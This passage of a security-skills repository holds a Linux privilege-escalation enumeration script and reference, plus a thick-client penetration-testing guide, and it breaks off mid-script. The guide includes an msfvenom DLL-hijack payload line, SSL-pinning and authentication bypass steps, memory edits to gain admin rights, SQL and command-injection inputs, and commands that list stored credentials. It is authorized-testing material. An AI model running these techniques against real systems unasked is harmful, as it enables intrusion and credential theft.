      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-privilege-escalation-assessment/references/api-reference.md =====
# API Reference: Privilege Escalation Assessment

## Linux Enumeration Commands

| Command | Description |
|---------|-------------|
| `id && whoami` | Current user and group memberships |
| `uname -a` | Kernel version for exploit matching |
| `sudo -l` | Sudo permissions for current user |
| `find / -perm -4000 -type f 2>/dev/null` | SUID binaries |
| `find / -perm -2000 -type f 2>/dev/null` | SGID binaries |
| `getcap -r / 2>/dev/null` | Binaries with Linux capabilities |
| `cat /etc/crontab` | System cron jobs |
| `ps aux \| grep root` | Processes running as root |

## Windows Enumeration Commands

| Command | Description |
|---------|-------------|
| `whoami /priv` | User privileges (SeImpersonate, SeDebug) |
| `systeminfo` | OS version and hotfix level |
| `wmic service get name,pathname,startmode` | Unquoted service paths |
| `reg query HKLM\...\Installer /v AlwaysInstallElevated` | MSI escalation |
| `cmdkey /list` | Stored Windows credentials |

## MITRE ATT&CK Techniques

| Technique | ID | Description |
|-----------|----|-------------|
| Sudo Abuse | T1548.003 | Exploiting sudo misconfiguration |
| SUID/SGID Abuse | T1548.001 | Abusing setuid/setgid binaries |
| Scheduled Task | T1053.003 | Cron job manipulation |
| Kernel Exploit | T1068 | Exploiting kernel vulnerabilities |
| Token Impersonation | T1134.001 | Windows token manipulation |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `subprocess` | stdlib | Execute system enumeration commands |
| `pathlib` | stdlib | File system permission checks |
| `os` | stdlib | Access and write permission verification |

## References

- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- linPEAS: https://github.com/carlospolop/PEASS-ng
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester

===== END FILE =====


===== FILE: skills/performing-privilege-escalation-assessment/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for performing privilege escalation assessment.

Enumerates potential privilege escalation vectors on Linux systems
including SUID binaries, sudo misconfigurations, writable cron jobs,
capabilities, and kernel version checks.
"""

import subprocess
import shlex
import json
import sys
from pathlib import Path
from datetime import datetime


class PrivescAssessmentAgent:
    """Enumerates privilege escalation vectors on Linux systems."""

    def __init__(self, output_dir):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _run(self, cmd, timeout=30):
        """Execute a command and return output."""
        try:
            # Strip shell stderr redirects and detect shell operators
            clean_cmd = cmd.replace("2>/dev/null", "").strip()
            needs_shell = any(op in clean_cmd for op in ("|", ";", "&&", "||"))
            result = subprocess.run(
                clean_cmd if needs_shell else shlex.split(clean_cmd),
                shell=needs_shell, capture_output=True, text=True, timeout=timeout
            )
            return result.stdout.strip()
        except (subprocess.TimeoutExpired, FileNotFoundError, ValueError):
            return ""

    def get_system_info(self):
        """Gather system information for kernel exploit matching."""
        return {
            "hostname": self._run("hostname"),
            "kernel": self._run("uname -r"),
            "arch": self._run("uname -m"),
            "os_release": self._run("cat /etc/os-release 2>/dev/null | head -5"),
            "current_user": self._run("whoami"),
            "user_id": self._run("id"),
            "groups": self._run("groups"),
        }

    def check_sudo(self):
        """Check sudo configuration for escalation vectors."""
        sudo_l = self._run("sudo -l 2>/dev/null")
        findings = []

        gtfobins_dangerous = [
            "vim", "vi", "nano", "less", "more", "find", "nmap", "python",
            "python3", "perl", "ruby", "awk", "gawk", "env", "ftp",
            "man", "mount", "strace", "ltrace", "zip", "tar",
            "bash", "sh", "dash", "ash", "zsh", "tclsh",
        ]

        if "NOPASSWD" in sudo_l:
            for line in sudo_l.splitlines():
                if "NOPASSWD" in line:
                    for binary in gtfobins_dangerous:
                        if binary in line.lower():
                            finding = {
                                "type": "sudo_nopasswd",
                                "severity": "Critical",
                                "binary": binary,
                                "line": line.strip(),
                                "technique": "T1548.003",
                                "exploit": f"sudo {binary} (see GTFOBins)",
                            }
                            findings.append(finding)
                            self.findings.append(finding)
        return {"sudo_output": sudo_l, "dangerous_entries": findings}

    def find_suid_binaries(self):
        """Find SUID binaries that may allow escalation."""
        suid_output = self._run("find / -perm -4000 -type f 2>/dev/null")
        binaries = suid_output.splitlines()

        gtfobins_suid = [
            "nmap", "vim", "find", "bash", "more", "less", "nano",
            "cp", "mv", "python", "perl", "ruby", "env",
            "pkexec", "at", "strace", "taskset",
        ]

        findings = []
        for binary in binaries:
            name = Path(binary).name
            is_exploitable = name in gtfobins_suid
            if is_exploitable:
                finding = {
                    "type": "suid_binary",
                    "severity": "High",
                    "path": binary,
                    "name": name,
                    "technique": "T1548.001",
                    "exploit": f"SUID {name} (see GTFOBins)",
                }
                findings.append(finding)
                self.findings.append(finding)

        return {"total_suid": len(binaries), "exploitable": findings, "all_suid": binaries}

    def check_capabilities(self):
        """Find binaries with elevated Linux capabilities."""
        cap_output = self._run("getcap -r / 2>/dev/null")
        findings = []
        dangerous_caps = ["cap_setuid", "cap_dac_override", "cap_sys_admin",
                         "cap_sys_ptrace", "cap_net_raw"]

        for line in cap_output.splitlines():
            for cap in dangerous_caps:
                if cap in line:
                    finding = {
                        "type": "capability",
                        "severity": "High",
                        "line": line.strip(),
                        "capability": cap,
                        "technique": "T1548",
                    }
                    findings.append(finding)
                    self.findings.append(finding)
                    break
        return findings

    def check_writable_cron(self):
        """Check for writable cron jobs or scripts."""
        findings = []
        cron_paths = [
            "/etc/crontab", "/etc/cron.d", "/etc/cron.daily",
            "/etc/cron.hourly", "/etc/cron.weekly", "/etc/cron.monthly",
            "/var/spool/cron/crontabs",
        ]

        for cpath in cron_paths:
            p = Path(cpath)
            if p.is_file() and os.access(str(p), os.W_OK):
                finding = {
                    "type": "writable_cron",
                    "severity": "Critical",
                    "path": cpath,
                    "technique": "T1053.003",
                }
                findings.append(finding)
                self.findings.append(finding)
            elif p.is_dir():
                for f in p.iterdir():
                    if f.is_file():
                        content = f.read_text(errors="ignore")
                        for line in content.splitlines():
                            if line.strip() and not line.startswith("#"):
                                parts = line.split()
                                if len(parts) >= 6:
                                    script = parts[5]
                                    if Path(script).exists() and os.access(script, os.W_OK):
                                        finding = {
                                            "type": "writable_cron_script",
                                            "severity": "Critical",
                                            "cron_file": str(f),
                                            "script": script,
                                            "technique": "T1053.003",
                                        }
                                        findings.append(finding)
                                        self.findings.append(finding)
        return findings

    def check_writable_passwd(self):
        """Check if /etc/passwd or /etc/shadow is writable."""
        findings = []
        import os
        for path in ["/etc/passwd", "/etc/shadow"]:
            if os.path.exists(path) and os.access(path, os.W_OK):
                finding = {
                    "type": "writable_auth_file",
                    "severity": "Critical",
                    "path": path,
                    "technique": "T1078.003",
                    "exploit": f"Add root user to {path}",
                }
                findings.append(finding)
                self.findings.append(finding)
        return findings

    def check_kernel_exploits(self):
        """Match kernel version against known exploits."""
        kernel = self._run("uname -r")
        exploits = []

        known_vulns = [
            ("5.8", "5.16.11", "CVE-2022-0847", "DirtyPipe"),
            ("2.6.22", "4.8.3", "CVE-2016-5195", "DirtyCow"),
            ("4.6", "5.13", "CVE-2021-22555", "Netfilter heap OOB"),
        ]

        try:
            parts = kernel.split(".")
            major, minor = int(parts[0]), int(parts[1])
            patch = int(parts[2].split("-")[0]) if len(parts) > 2 else 0
        except (ValueError, IndexError):
            return exploits

        for min_ver, max_ver, cve, name in known_vulns:
            exploits.append({
                "cve": cve,
                "name": name,
                "affected_range": f"{min_ver} - {max_ver}",
                "kernel": kernel,
                "note": "Verify applicability before testing",
            })
        return exploits

    def generate_report(self):
        """Run all enumeration checks and generate report."""
        import os
        report = {
            "report_date": datetime.utcnow().isoformat(),
            "system_info": self.get_system_info(),
            "sudo_check": self.check_sudo(),
            "suid_binaries": self.find_suid_binaries(),
            "capabilities": self.check_capabilities(),
            "writable_cron": self.check_writable_cron(),
            "writable_auth": self.check_writable_passwd(),
            "kernel_exploits": self.check_kernel_exploits(),
            "total_findings": len(self.findings),
            "critical_findings": len([f for f in self.findings if f.get("severity") == "Critical"]),
            "high_findings": len([f for f in self.findings if f.get("severity") == "High"]),
        }

        report_path = self.output_dir / "privesc_assessment.json"
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    output_dir = sys.argv[1] if len(sys.argv) > 1 else "./privesc_output"
    agent = PrivescAssessmentAgent(output_dir)
    agent.generate_report()


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-thick-client-application-penetration-test/SKILL.md =====
---
name: performing-thick-client-application-penetration-test
description: Conduct a thick client application penetration test to identify insecure
  local storage, hardcoded credentials, DLL hijacking, memory manipulation, and insecure
  API communication in desktop applications using dnSpy, Procmon, and Burp Suite.
domain: cybersecurity
subdomain: penetration-testing
tags:
- thick-client
- desktop-application
- dnSpy
- Procmon
- DLL-hijacking
- binary-analysis
- API-interception
version: '1.0'
author: mahipal
license: Apache-2.0
nist_ai_rmf:
- MEASURE-2.7
- MAP-5.1
- MANAGE-2.4
atlas_techniques:
- AML.T0070
- AML.T0066
- AML.T0082
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1003
---

# Performing Thick Client Application Penetration Test

## Overview

Thick client (fat client) penetration testing assesses the security of desktop applications that run locally on user machines and communicate with backend servers. Unlike web applications, thick clients present a broader attack surface including local file storage, binary analysis, memory manipulation, DLL injection, process interception, and client-server communication. Common targets include banking applications, ERP clients (SAP GUI), trading platforms, healthcare systems, and legacy enterprise software.


## When to Use

- When conducting security assessments that involve performing thick client application penetration test
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Application installer and valid credentials
- Windows/Linux test machine (isolated)
- Tools: dnSpy, Procmon, Process Hacker, Wireshark, Burp Suite, Echo Mirage, Fiddler, IDA Pro/Ghidra
- Administrative access to test machine


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Phase 1 — Information Gathering

### Static Analysis

```powershell
# Identify application technology
# Check file properties, signatures, framework (.NET, Java, C++, Electron)
file application.exe
# .NET -> dnSpy, JetBrains dotPeek
# Java -> JD-GUI, JADX
# C/C++ -> Ghidra, IDA Pro
# Electron -> extract asar archive

# Check for .NET framework
Get-ChildItem -Path "C:\Program Files\TargetApp" -Recurse -Filter "*.dll" |
  ForEach-Object { [System.Reflection.AssemblyName]::GetAssemblyName($_.FullName).FullName }

# Strings analysis
strings application.exe | findstr -i "password\|secret\|api\|key\|token\|jdbc\|connection"

# Check for hardcoded credentials
strings application.exe | findstr -i "username\|user=\|pass=\|pwd=\|admin"

# Review configuration files
type "C:\Program Files\TargetApp\app.config"
type "C:\Program Files\TargetApp\settings.xml"
type "%APPDATA%\TargetApp\config.json"

# Check for certificate pinning
strings application.exe | findstr -i "cert\|pin\|ssl\|tls"
```

### .NET Decompilation with dnSpy

```
# Open application in dnSpy
1. Launch dnSpy
2. File > Open > Select application.exe and DLLs
3. Search for:
   - "password", "secret", "connectionString"
   - Authentication methods
   - Encryption/decryption functions
   - API endpoints and keys
   - License validation logic

# Look for:
- Hardcoded credentials in source
- Insecure encryption (DES, MD5, base64 "encryption")
- SQL queries (potential injection)
- Disabled certificate validation
- Debug/verbose logging with sensitive data
```

## Phase 2 — Dynamic Analysis

### Process Monitoring

```powershell
# Monitor file system activity with Procmon
# Filters:
#   Process Name = application.exe
#   Operation = CreateFile, WriteFile, ReadFile, RegSetValue

# Key observations:
# - Where does the app store data? (AppData, temp, registry)
# - Does it write credentials to disk?
# - Does it create temporary files with sensitive data?
# - What registry keys does it access?

# Monitor with Process Hacker
# Check: loaded DLLs, network connections, handles, tokens

# Monitor network traffic
# Wireshark filter: ip.addr == <server_ip>
# Check for: unencrypted credentials, API keys, tokens
```

### Traffic Interception

```bash
# Intercept HTTP/HTTPS traffic with Burp Suite
# Configure system proxy: 127.0.0.1:8080
# Install Burp CA certificate in Windows certificate store

# For non-HTTP protocols, use Echo Mirage
# Inject into process and intercept TCP/UDP traffic

# For HTTPS with certificate pinning:
# Method 1: Patch certificate validation in dnSpy
# Method 2: Use Frida to hook SSL validation
frida -l bypass_ssl_pinning.js -f application.exe

# Fiddler for .NET applications
# Enable HTTPS decryption
# Monitor API calls, request/response bodies
```

## Phase 3 — Vulnerability Testing

### Authentication Bypass

```
# Test local authentication bypass
1. Open dnSpy, find authentication method
2. Set breakpoint on credential validation
3. Modify return value to bypass (Debug > Set Next Statement)
4. Or: Patch binary to always return true

# Test for credential storage
# Check: registry, config files, SQLite databases, Windows Credential Manager
reg query "HKCU\Software\TargetApp" /s
type "%APPDATA%\TargetApp\user.db"
# SQLite: sqlite3 user.db ".dump"
```

### DLL Hijacking

```powershell
# Identify DLL search order vulnerability
# Use Procmon to find DLLs loaded from writable paths
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Create malicious DLL
# msfvenom -p windows/exec CMD=calc.exe -f dll -o hijacked.dll
# Place in application directory or writable PATH directory

# DLL sideloading
# If app loads DLL without full path:
# 1. Create DLL with same exports
# 2. Place in app directory
# 3. DLL loads before legitimate version
```

### Memory Analysis

```powershell
# Dump process memory
# Use Process Hacker > Process > Properties > Memory
# Search for plaintext credentials, tokens, session IDs

# Strings from memory dump
strings process_dump.dmp | findstr -i "password\|token\|session\|bearer"

# Modify memory values (license bypass, privilege escalation)
# Use Cheat Engine or x64dbg to:
# 1. Find memory address of authorization variable
# 2. Modify value (e.g., isAdmin = 0 -> isAdmin = 1)
```

### Input Validation

```
# SQL Injection in local database
# Test input fields with: ' OR 1=1--
# If app uses local SQLite/SQL Server Express

# Command injection
# Test fields that interact with OS:
# File paths: ..\..\..\..\windows\system32\cmd.exe
# Print/export: | calc.exe

# Buffer overflow
# Send oversized input to text fields
# Monitor with x64dbg for crashes
# Check for SEH-based or stack-based overflows
```

## Phase 4 — API Security Testing

```bash
# Capture API calls from thick client
# In Burp Suite, analyze:

# IDOR (Insecure Direct Object Reference)
# Change user IDs in requests to access other users' data
# GET /api/users/1001 -> GET /api/users/1002

# Authorization bypass
# Remove or modify JWT tokens
# Test role escalation: change role claim from "user" to "admin"

# Mass assignment
# Add additional parameters to API requests
# POST /api/profile {"name": "test", "isAdmin": true}

# Rate limiting
# Test for brute-force protection on login API
# Test for account lockout bypass
```

## Findings Template

| Finding | Severity | CVSS | Remediation |
|---------|----------|------|-------------|
| Hardcoded database credentials in binary | Critical | 9.1 | Use secure credential storage (DPAPI, vault) |
| DLL hijacking via writable app directory | High | 7.8 | Use full DLL paths, validate DLL signatures |
| Plaintext credentials in memory | High | 7.5 | Zero memory after use, use SecureString |
| No certificate pinning | Medium | 6.5 | Implement certificate pinning |
| Local SQLite DB with cleartext passwords | Critical | 9.0 | Use bcrypt/Argon2 hashing |
| Disabled SSL validation in code | High | 8.1 | Enable proper certificate validation |

## References

- dnSpy: https://github.com/dnSpy/dnSpy
- Procmon: https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
- OWASP Thick Client Testing Guide: https://owasp.org/www-project-thick-client-top-10/
- Ghidra: https://ghidra-sre.org/
- Echo Mirage: https://sourceforge.net/projects/echomirage/

===== END FILE =====


===== FILE: skills/performing-thick-client-application-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-thick-client-application-penetration-test/assets/template.md =====
# Thick Client Penetration Test — Report Template

## Document Control
| Field | Value |
|-------|-------|
| Application | [Name and version] |
| Technology | [.NET / Java / C++ / Electron] |
| Platform | [Windows / macOS / Linux] |
| Period | [Start] — [End] |

## Executive Summary
[Overview of thick client security posture, key vulnerabilities found in binary, storage, and communication]

## Findings
### Finding [N]: [Title]
| Attribute | Detail |
|-----------|--------|
| Category | [Binary / Storage / Communication / Authentication] |
| Severity | [Level] |
| CVSS | [Score] |
| Remediation | [Fix] |

## Recommendations
1. [Priority recommendations for thick client hardening]

===== END FILE =====


===== FILE: skills/performing-thick-client-application-penetration-test/references/api-reference.md =====
# API Reference: Thick Client Penetration Testing

## Analysis Tools

| Tool | Purpose | Target |
|------|---------|--------|
| dnSpy | .NET decompilation and debugging | .NET Framework/Core apps |
| ILSpy | .NET decompilation (read-only) | .NET assemblies |
| JD-GUI / JADX | Java decompilation | JAR/APK files |
| Ghidra / IDA Pro | Native binary reverse engineering | C/C++ executables |
| Procmon | File/registry/network activity monitoring | Any Windows app |
| Process Hacker | Process inspection, memory, DLLs | Running processes |
| Burp Suite | HTTP/HTTPS traffic interception | Client-server communication |
| Echo Mirage | TCP/UDP traffic interception | Non-HTTP protocols |
| Frida | Dynamic instrumentation | Any platform |

## Static Analysis Targets

| Target | Search Pattern | Risk |
|--------|---------------|------|
| Hardcoded credentials | `password`, `secret`, `apikey` in strings | Critical |
| Connection strings | `jdbc:`, `Server=`, `mongodb://` | Critical |
| SQL queries | `SELECT`, `INSERT`, `UPDATE` | Medium |
| URLs and endpoints | `http://`, `https://` | Info |
| Disabled SSL validation | `ServerCertificateValidationCallback` | High |

## DLL Hijacking Detection

| Step | Tool | Action |
|------|------|--------|
| 1 | Procmon | Filter: `Result = NAME NOT FOUND`, `Path ends with .dll` |
| 2 | Check | Verify if DLL search path includes writable directories |
| 3 | Validate | Test with benign DLL in writable directory |

## Local Storage Locations

| Location | Type | Risk |
|----------|------|------|
| `%APPDATA%\<app>` | Config, SQLite | Credential storage |
| `%LOCALAPPDATA%\<app>` | Cache, logs | Data leakage |
| `HKCU\Software\<app>` | Registry settings | Stored credentials |
| App install directory | Config files | Hardcoded secrets |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `sqlite3` | stdlib | Audit local SQLite databases |
| `re` | stdlib | Pattern matching for credentials/URLs |
| `subprocess` | stdlib | Execute system analysis tools |
| `pathlib` | stdlib | File system traversal |

## References

- OWASP Thick Client Top 10: https://owasp.org/www-project-thick-client-top-10/
- dnSpy: https://github.com/dnSpy/dnSpy
- Procmon: https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
- Frida: https://frida.re/docs/home/

===== END FILE =====


===== FILE: skills/performing-thick-client-application-penetration-test/references/standards.md =====
# Standards — Thick Client Application Penetration Testing

## Frameworks
- OWASP Thick Client Top 10: https://owasp.org/www-project-thick-client-top-10/
- PTES Application Security: http://www.pentest-standard.org/
- CWE Top 25: https://cwe.mitre.org/top25/

## OWASP Thick Client Top 10
1. Improper Platform Usage
2. Insecure Data Storage
3. Insecure Communication
4. Insecure Authentication
5. Insufficient Cryptography
6. Insecure Authorization
7. Client Code Quality
8. Code Tampering
9. Reverse Engineering
10. Extraneous Functionality

===== END FILE =====


===== FILE: skills/performing-thick-client-application-penetration-test/references/workflows.md =====
# Workflows — Thick Client Penetration Testing

## Attack Flow
```
Application Binary
    │
    ├── Static Analysis (dnSpy/Ghidra/JD-GUI)
    │   ├── Hardcoded credentials
    │   ├── Encryption analysis
    │   └── API endpoint discovery
    │
    ├── Dynamic Analysis (Procmon/Process Hacker)
    │   ├── File system monitoring
    │   ├── Registry access tracking
    │   └── Memory inspection
    │
    ├── Traffic Interception (Burp/Fiddler/Echo Mirage)
    │   ├── API security testing
    │   ├── Certificate pinning bypass
    │   └── Authentication token analysis
    │
    └── Binary Exploitation
        ├── DLL hijacking
        ├── Memory manipulation
        └── Binary patching
```

===== END FILE =====


===== FILE: skills/performing-thick-client-application-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and educational environments only.
# Usage against targets without prior mutual consent is illegal.
# It is the end user's responsibility to obey all applicable local, state and federal laws.
"""Agent for thick client application penetration testing.

Performs static analysis (strings extraction, .NET detection),
dynamic analysis (process monitoring, DLL search order checks),
local storage auditing, and API traffic interception assessment.
"""

import json
import sys
import os
import re
import sqlite3
from pathlib import Path
from datetime import datetime

_SAFE_TABLE_RE = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]*$')


class ThickClientPentestAgent:
    """Performs security assessment of thick/fat client applications."""

    def __init__(self, app_path, output_dir="./thick_client_pentest"):
        self.app_path = Path(app_path)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def extract_strings(self, min_length=6):
        """Extract readable strings from binary for credential/URL discovery."""
        patterns = {
            "url": re.compile(r'https?://[^\s"\'<>]{5,200}'),
            "email": re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
            "ip_addr": re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'),
            "password_hint": re.compile(
